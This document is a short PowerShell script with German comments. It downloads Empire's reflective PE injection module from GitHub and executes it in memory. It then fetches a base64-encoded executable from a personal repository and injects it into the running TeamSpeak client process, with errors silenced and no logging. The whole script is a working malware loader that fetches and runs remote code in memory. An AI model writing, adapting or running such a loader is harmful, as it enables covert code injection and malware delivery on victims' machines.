$ErrorActionPreference = 'SilentlyContinue'

# Wartezeit für Stabilität
Start-Sleep -Seconds 5 

try {
    [Net.ServicePointManager]::SecurityProtocol = 3072
    
    # Loader laden via iwr
    $loaderUrl = "https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/management/Invoke-ReflectivePEInjection.ps1"
    $loaderContent = (iwr -UseBasicParsing $loaderUrl).Content
    Invoke-Expression $loaderContent

    # Deine EXE-Daten laden (bleibt johannesschwein.txt)
    $exeUrl = "https://raw.githubusercontent.com/spritezerosugar67/johannesschwein/refs/heads/main/johannesschwein.txt"
    $base64String = (iwr -UseBasicParsing $exeUrl).Content
    
    $peBytes = [System.Convert]::FromBase64String($base64String)

    # Injektion in TeamSpeak
    $target = Get-Process ts3client_win64
    Invoke-ReflectivePEInjection -PEBytes $peBytes -ProcId $target.Id -ForceASLR
} catch {
    # Keine Logs bei Fehlern
}
